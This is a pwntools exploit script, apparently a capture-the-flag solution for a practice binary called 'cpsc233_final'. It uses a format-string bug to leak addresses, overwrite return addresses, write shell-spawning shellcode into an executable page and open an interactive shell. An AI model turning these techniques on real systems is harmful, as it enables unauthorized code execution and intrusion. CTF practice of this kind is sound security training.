#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host cpsc233-final.ctf.maplebacon.org --port 1337 cpsc233_final
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('cpsc233_final')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'cpsc233-final.ctf.maplebacon.org'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
break *main+303
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

rsp = None

# this page may move due to stack shenanigans
rwx = 0x00000002333000

def setup(io):
    global rsp

    # initial main
    # goal is to leak exe base and loop into main before the fmt string read

    io.recvuntil(b'======== Final Exam (Your Exam ID: ')
    rsp = int(io.recvuntil(b')========\n', drop=True), 0) - 0x20
    info(f'rsp: {hex(rsp)}')

    io.recvuntil(b'Enter your name: \n')
    io.send(pack(rsp - 0x8))

    io.recvuntil(b'please put your function shellcode here: \n')
    io.send(b'90')

    io.recvuntil(b'pleas give us feedback about this course: ')
    offset = 245
    ret_write = (exe.sym['main'] + offset) & 0xff
    fmt = f'%{ret_write}c%10$hhn||%10$s||\0'
    io.send(fmt.encode())
    io.recvuntil(b'||')
    exe.address = (
            unpack(io.recvuntil(b'||', drop=True).ljust(8, b'\x00'))
            - (exe.sym['main'] + offset)
    )
    info(f'exe.address: {hex(exe.address)}')

    # main+offset
    # goal is to loop back to main+1, so a new stack is made without pushing rbp

    io.recvuntil(b'pleas give us feedback about this course: ')
    ret_write = (exe.sym['main'] + 1) & 0xffff
    fmt = f'%{ret_write}c%10$hn\0'
    io.send(fmt.encode())
    old_stack = rsp - 0x8
    rsp -= 0x30
    new_stack = rsp - 0x8

    # stack groom
    # keep shifting stack by 0x30 until pointers match except the last byte

    while old_stack & 0xffffffffffffff00 != new_stack & 0xffffffffffffff00:
        io.recvuntil(b'Enter your name: \n')
        io.send(pack(rsp - 0x8))

        io.recvuntil(b'please put your function shellcode here: \n')
        io.send(b'90')

        io.recvuntil(b'pleas give us feedback about this course: ')
        ret_write = (exe.sym['main'] + 1) & 0xffff
        fmt = f'%{ret_write}c%10$hn\0'
        io.send(fmt.encode())
        old_stack = rsp - 0x8
        rsp -= 0x30
        new_stack = rsp - 0x8

    # main+1, new stack
    # begin setting up arbitrary actions

    io.recvuntil(b'Enter your name: \n')
    io.send(pack(rsp - 0x8))

    io.recvuntil(b'please put your function shellcode here: \n')
    io.send(b'90')

    io.recvuntil(b'pleas give us feedback about this course: ')
    ret_write = (exe.sym['main'] + 120) & 0xffff
    write_byte = ((rsp - 0x8) - ret_write) % 0x100
    if write_byte <= 0x0:
        write_byte += 0x100
    fmt = f'%{ret_write}c%10$hn%{write_byte}c%15$hhn'
    io.send(fmt.encode())

    # offset 16 can now overwrite the printf return
    # this frees the name field for arbitrary actions

def write_byte(addr, val):
    io.recvuntil(b'Enter your name: \n')
    io.send(pack(addr))

    io.recvuntil(b'please put your function shellcode here: \n')
    io.send(b'90')

    io.recvuntil(b'pleas give us feedback about this course: ')
    ret_write = (exe.sym['main'] + 120) & 0xffff
    write_byte = (val - ret_write) % 0x100
    if write_byte <= 0x0:
        write_byte += 0x100
    fmt = f'%{ret_write}c%16$hn%{write_byte}c%10$hhn'
    io.send(fmt.encode())

def leak_ptr(addr):
    io.recvuntil(b'Enter your name: \n')
    io.send(pack(addr))

    io.recvuntil(b'please put your function shellcode here: \n')
    io.send(b'90')

    io.recvuntil(b'pleas give us feedback about this course: ')
    ret_write = (exe.sym['main'] + 120) & 0xffff
    fmt = f'%{ret_write}c%16$hn||%10$s||\0'
    io.send(fmt.encode())
    io.recvuntil(b'||')
    return unpack(io.recvuntil(b'||', drop=True).ljust(8, b'\x00'))

def jump_to_shellcode():
    # we assume that rwx is written to rsp + 8
    io.recvuntil(b'Enter your name: \n')
    io.send(pack(0))

    io.recvuntil(b'please put your function shellcode here: \n')
    io.send(b'90')

    io.recvuntil(b'pleas give us feedback about this course: ')
    # pop rbp ; ret ;
    ret_write = (exe.sym['main'] - 2) & 0xffff
    fmt = f'%{ret_write}c%16$hn\0'
    io.send(fmt.encode())

io = start()

setup(io)

# lowest 12 bits expected to be null, need to leak at offset
rwx = leak_ptr(rsp + 0x8 + 1) << 8
info(f'rwx: {hex(rwx)}')

shellcode = asm(shellcraft.sh())

# start at offset 1 because of the NOP
i = 1
for b in shellcode:
    write_byte(rwx + i, b)
    i += 1

jump_to_shellcode()

io.interactive()
